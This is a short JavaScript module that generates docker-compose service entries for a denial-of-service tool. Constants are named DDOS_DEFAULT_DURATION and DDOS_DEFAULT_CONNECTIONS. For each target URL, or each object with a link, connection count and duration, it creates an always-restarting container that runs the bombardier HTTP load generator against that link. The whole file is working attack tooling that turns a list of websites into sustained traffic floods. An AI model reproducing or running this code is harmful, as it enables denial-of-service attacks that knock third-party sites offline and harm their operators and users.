import { DDOS_DEFAULT_DURATION, DDOS_DEFAULT_CONNECTIONS } from '../constants/DEFAULT_VALUES.js'


function getName(name) {
    if (name.includes('http://')) {
        return name.split('http://')[1].split('/')[0]
    } else if (name.includes('https://')) {
        return name.split('https://')[1].split('/')[0]
    }
}

export function generateContainerItem (item) {
    let link, duration, connections, name
    if (typeof item === "string") {
        link = item;
        name = getName(item);
        duration = DDOS_DEFAULT_DURATION;
        connections = DDOS_DEFAULT_CONNECTIONS;
    } else if (typeof item === "object" && item.link) {
        link = item.link;
        name = getName(item.link);
        duration = item.duration || DDOS_DEFAULT_DURATION;
        connections = item.connections || DDOS_DEFAULT_CONNECTIONS;
    }

    const UID = `UID_${(+Math.random() * 10000).toFixed()}`

    return '\n' +
        `  ${UID}:\n` +
        `    container_name: ${name}_${UID}\n` +
        `    image: alpine/bombardier\n` +
        `    restart: always\n` +
        `    command: -c ${connections} -d ${duration} -l ${link}` +
        '\n'
}